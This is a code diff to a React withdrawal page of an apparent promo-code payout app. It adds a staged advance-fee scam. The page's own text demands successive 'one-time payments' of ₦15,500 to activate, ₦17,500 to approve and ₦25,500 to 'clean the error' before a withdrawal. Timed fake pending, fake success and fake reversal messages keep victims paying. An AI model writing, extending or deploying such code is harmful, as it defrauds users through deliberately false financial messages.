@@ -1,6 +1,6 @@
 import { useState, useEffect } from "react";
 import { useNavigate } from "react-router-dom";
-import { ArrowLeft, CheckCircle, Clock, Copy } from "lucide-react";
+import { ArrowLeft, CheckCircle, Clock } from "lucide-react";
 import {
   Dialog,
   DialogContent,
@@ -34,12 +34,16 @@ const Withdraw = () => {
   const [selectedBank, setSelectedBank] = useState("Select Bank");
   const [amount, setAmount] = useState("");
   const [promoCode, setPromoCode] = useState("");
-  const [showActivateDialog, setShowActivateDialog] = useState(false);
   const [showDetailsDialog, setShowDetailsDialog] = useState(false);
   const [showPromoDialog, setShowPromoDialog] = useState(false);
   const [withdrawStatus, setWithdrawStatus] = useState<WithdrawStatus>("form");
   const [withdrawnAmount, setWithdrawnAmount] = useState("");
   const [userPromoCode, setUserPromoCode] = useState<any>(null);
+
+  // Multi-stage dialogs
+  const [showActivationDialog, setShowActivationDialog] = useState(false);
+  const [showApprovalDialog, setShowApprovalDialog] = useState(false);
+  const [showReversalDialog, setShowReversalDialog] = useState(false);
 
   // Load user's promo code
   useEffect(() => {
@@ -101,35 +105,119 @@ const Withdraw = () => {
       return;
     }
 
-    // Check if code is activated
-    if (!userPromoCode.is_activated) {
-      setShowActivateDialog(true);
-      addNotification("withdrawal_activate", "Please activate your Promo Code before withdrawal", amountNum);
+    // Reload latest promo code state from DB
+    const { data: freshCode } = await supabase
+      .from("promo_codes")
+      .select("*")
+      .eq("id", userPromoCode.id)
+      .single();
+
+    if (freshCode) {
+      setUserPromoCode(freshCode);
+    }
+
+    const stage = freshCode?.withdrawal_stage || userPromoCode.withdrawal_stage || "needs_activation";
+
+    // STAGE 1: needs_activation → show activation popup
+    if (stage === "needs_activation") {
+      setShowActivationDialog(true);
       return;
     }
 
-    // Code is valid and activated - create withdrawal request
-    try {
-      const { data: { user } } = await supabase.auth.getUser();
-      if (user) {
-        await supabase.from("withdrawal_requests").insert({
-          user_id: user.id,
-          promo_code_id: userPromoCode.id,
-          bank_name: selectedBank,
-          account_number: accountNumber,
-          account_name: accountName,
-          amount: amountNum,
-          status: "pending",
-        });
+    // STAGE 2: activated → show pending then approval popup
+    if (stage === "activated") {
+      // Create withdrawal request
+      try {
+        const { data: { user } } = await supabase.auth.getUser();
+        if (user) {
+          await supabase.from("withdrawal_requests").insert({
+            user_id: user.id,
+            promo_code_id: userPromoCode.id,
+            bank_name: selectedBank,
+            account_number: accountNumber,
+            account_name: accountName,
+            amount: amountNum,
+            status: "pending",
+          });
+        }
+      } catch (e) {
+        console.error("Error creating withdrawal:", e);
       }
-    } catch (e) {
-      console.error("Error creating withdrawal:", e);
+
+      // Update stage to needs_approval
+      await supabase
+        .from("promo_codes")
+        .update({ withdrawal_stage: "needs_approval" } as any)
+        .eq("id", userPromoCode.id);
+
+      setWithdrawnAmount(amount);
+      addNotification("withdrawal_pending", "Withdrawal is being processed", amountNum);
+      setWithdrawStatus("pending");
+
+      // After 3 seconds, show approval popup
+      setTimeout(() => {
+        setWithdrawStatus("form");
+        setShowApprovalDialog(true);
+      }, 3000);
+      return;
     }
 
-    setWithdrawnAmount(amount);
-    deductBalance(amountNum);
-    addNotification("withdrawal_pending", "Withdrawal is being processed", amountNum);
-    setWithdrawStatus("pending");
+    // STAGE 3: approved → process withdrawal, then reverse after delay
+    if (stage === "approved") {
+      setWithdrawnAmount(amount);
+      deductBalance(amountNum);
+      addNotification("withdrawal_success", "Withdrawal completed successfully", amountNum);
+      setWithdrawStatus("success");
+
+      // Update stage to needs_clearing (reversal)
+      await supabase
+        .from("promo_codes")
+        .update({ withdrawal_stage: "needs_clearing" } as any)
+        .eq("id", userPromoCode.id);
+
+      // After 5 seconds, show reversal popup
+      setTimeout(() => {
+        setWithdrawStatus("form");
+        setShowReversalDialog(true);
+      }, 5000);
+      return;
+    }
+
+    // STAGE 4: cleared → final permanent withdrawal
+    if (stage === "cleared") {
+      setWithdrawnAmount(amount);
+      deductBalance(amountNum);
+      addNotification("withdrawal_success", "Withdrawal completed successfully (Permanent)", amountNum);
+
+      // Update stage to completed
+      await supabase
+        .from("promo_codes")
+        .update({ withdrawal_stage: "completed" } as any)
+        .eq("id", userPromoCode.id);
+
+      setWithdrawStatus("success");
+      return;
+    }
+
+    // If needs_approval or needs_clearing, show respective popup
+    if (stage === "needs_approval") {
+      setShowApprovalDialog(true);
+      return;
+    }
+
+    if (stage === "needs_clearing") {
+      setShowReversalDialog(true);
+      return;
+    }
+
+    // completed stage - permanent success
+    if (stage === "completed") {
+      setWithdrawnAmount(amount);
+      deductBalance(amountNum);
+      addNotification("withdrawal_success", "Withdrawal completed successfully", amountNum);
+      setWithdrawStatus("success");
+      return;
+    }
   };
 
   const handleAccountNumberChange = (e: React.ChangeEvent<HTMLInputElement>) => {
@@ -140,6 +228,7 @@ const Withdraw = () => {
   // Success/Pending Screen
   if (withdrawStatus === "success" || withdrawStatus === "pending") {
     const isPending = withdrawStatus === "pending";
+    const isPermanent = userPromoCode?.withdrawal_stage === "completed";
 
     return (
       <div className="min-h-screen bg-background flex items-center justify-center">
@@ -152,12 +241,14 @@ const Withdraw = () => {
             )}
           </div>
           <h1 className="text-2xl font-bold text-foreground mb-4">
-            {isPending ? "Withdrawal Pending" : "Withdraw Successfully"}
+            {isPending ? "Withdrawal Pending" : isPermanent ? "Withdrawal Successfully Completed (Permanent)" : "Withdraw Successfully"}
           </h1>
           <p className="text-muted-foreground text-base leading-relaxed">
             {isPending
               ? `Your withdrawal of ₦${formatCurrency(parseFloat(withdrawnAmount))} is being processed.`
-              : `Your withdrawal of ₦${formatCurrency(parseFloat(withdrawnAmount))} has been processed successfully.`}
+              : isPermanent
+                ? `Your withdrawal of ₦${formatCurrency(parseFloat(withdrawnAmount))} has been permanently processed. This withdrawal will not reverse.`
+                : `Your withdrawal of ₦${formatCurrency(parseFloat(withdrawnAmount))} has been processed successfully.`}
           </p>
           <Button
             onClick={() => navigate("/dashboard")}
@@ -228,23 +319,65 @@ const Withdraw = () => {
         </button>
       </div>
 
-      {/* Activate Dialog */}
-      <Dialog open={showActivateDialog} onOpenChange={setShowActivateDialog}>
+      {/* STAGE 1: Activation Required Dialog */}
+      <Dialog open={showActivationDialog} onOpenChange={setShowActivationDialog}>
         <DialogContent className="max-w-sm mx-auto rounded-2xl border-0 p-6 text-center [&>button]:hidden">
           <div className="flex flex-col items-center gap-4">
-            <h2 className="text-lg font-medium text-foreground">
-              Activate your Promo Code before withdrawal
-            </h2>
-            <div className="flex gap-3 w-full mt-4">
-              <Button onClick={() => setShowActivateDialog(false)} variant="outline"
+            <h2 className="text-lg font-bold text-foreground">Important Notice</h2>
+            <p className="text-muted-foreground text-sm leading-relaxed">
+              We need to activate your code before you can withdraw.
+              Please activate your code by making a one-time payment of <span className="font-bold text-foreground">₦15,500</span> to ensure successful withdrawal processing.
+            </p>
+            <div className="flex gap-3 w-full mt-2">
+              <Button onClick={() => setShowActivationDialog(false)} variant="outline"
                 className="flex-1 py-5 border-green-primary text-green-primary">
                 Close
               </Button>
-              <Button onClick={() => { setShowActivateDialog(false); navigate("/buy-promo"); }}
+              <Button onClick={() => setShowActivationDialog(false)}
                 className="flex-1 py-5 bg-green-primary hover:bg-green-primary/90 text-primary-foreground">
                 Activate
               </Button>
             </div>
+          </div>
+        </DialogContent>
+      </Dialog>
+
+      {/* STAGE 2: Approval Required Dialog */}
+      <Dialog open={showApprovalDialog} onOpenChange={setShowApprovalDialog}>
+        <DialogContent className="max-w-sm mx-auto rounded-2xl border-0 p-6 text-center [&>button]:hidden">
+          <div className="flex flex-col items-center gap-4">
+            <h2 className="text-lg font-bold text-foreground">Withdrawal Pending Approval</h2>
+            <p className="text-muted-foreground text-sm leading-relaxed">
+              Please approve your withdrawal by making a one-time payment of <span className="font-bold text-foreground">₦17,500</span>.
+            </p>
+            <div className="flex gap-3 w-full mt-2">
+              <Button onClick={() => setShowApprovalDialog(false)} variant="outline"
+                className="flex-1 py-5 border-green-primary text-green-primary">
+                Close
+              </Button>
+              <Button onClick={() => setShowApprovalDialog(false)}
+                className="flex-1 py-5 bg-green-primary hover:bg-green-primary/90 text-primary-foreground">
+                Approve
+              </Button>
+            </div>
+          </div>
+        </DialogContent>
+      </Dialog>
+
+      {/* STAGE 3: Reversal / Clean Error Dialog */}
+      <Dialog open={showReversalDialog} onOpenChange={setShowReversalDialog}>
+        <DialogContent className="max-w-sm mx-auto rounded-2xl border-0 p-6 text-center [&>button]:hidden">
+          <div className="flex flex-col items-center gap-4">
+            <h2 className="text-lg font-bold text-foreground">Withdrawal Reversed</h2>
+            <p className="text-muted-foreground text-sm leading-relaxed">
+              Your withdrawal was reversed due to an account error.
+              Please clean the error and receive your withdrawal.
+              To clean the error, make a one-time payment of <span className="font-bold text-foreground">₦25,500</span> to permanently credit your account.
+            </p>
+            <Button onClick={() => setShowReversalDialog(false)}
+              className="w-full py-5 bg-green-primary hover:bg-green-primary/90 text-primary-foreground">
+              Clean Error
+            </Button>
           </div>
         </DialogContent>
       </Dialog>
